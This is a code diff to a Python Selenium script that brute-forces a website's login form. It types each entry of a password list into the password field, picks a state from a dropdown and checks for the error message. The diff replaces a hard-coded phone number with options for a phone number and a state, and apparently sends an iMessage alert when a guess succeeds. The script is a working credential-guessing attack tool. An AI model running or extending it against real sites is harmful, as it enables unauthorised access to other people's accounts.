@@ -15,8 +15,6 @@ from selenium.webdriver.support.select import Select
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
 
-phone = "4042192150"
-
 #Graphics
 class color:
    PURPLE = '\033[95m'
@@ -41,10 +39,11 @@ now = datetime.datetime.now()
 #parser.add_option("-u", "--username", dest="username",help="Choose the username")
 #parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
 #parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
-
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the submit button selector")
 parser.add_option("--errorsel", dest="errorsel",help= "Choose the message selector")
 parser.add_option("--dropdown", dest="dropdown",help= "Choose the dropdown menu's id")
+parser.add_option("--phonenumber", dest="phonenumber",help= "Choose the phone number to text")
+parser.add_option("--state", dest="state",help= "Choose the state on the website")
 #parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
@@ -80,6 +79,8 @@ def wizard():
     login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
     error_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Error message selector: ')
     drop_down =  raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Drop Down Menus ID: ')
+    state =  raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the State on the website: ')
+    phone_number = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Phone Number to text: ')
     #username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
     #pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     brutes(login_btn_selector, error_selector, drop_down, website)
@@ -105,8 +106,8 @@ def brutes(login_btn_selector, error_selector, drop_down, website):
                 #Sel_user.send_keys(username)
                 sel = Select(driver.find_element_by_id(drop_down))
                 time.sleep(0.8)
-                #select by select_by_index() method
-                sel.select_by_index(13)
+                #select by select_by_visible_text() method
+                sel.select_by_visible_text(state)
                 Sel_pas.send_keys(line)
                 t.sleep(1)
                 error = browser.find_element_by_css_selector(error_selector) #Finds Selector
@@ -116,6 +117,7 @@ def brutes(login_btn_selector, error_selector, drop_down, website):
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
+            phone = phone_number
             if not imessage.check_compatibility(phone):
             print("Not an iPhone")
 
@@ -145,7 +147,9 @@ if options.loginsel == None:
     if options.errorsel == None:
         if options.website == None:
             if options.dropdown == None:
-                wizard()
+                if options.phonenumber == None:
+                    if options.state == None:
+                        wizard()
 
 
 #username = options.username
@@ -155,6 +159,8 @@ login_btn_selector = options.loginsel
 error_selector = options.errorsel
 website = options.website
 drop_down = options.dropdown
+phone_number = options.phonenumber
+state = options.state
 #pass_list = options.passlist
 print banner
 brutes(login_btn_selector, error_selector, drop_down, website)
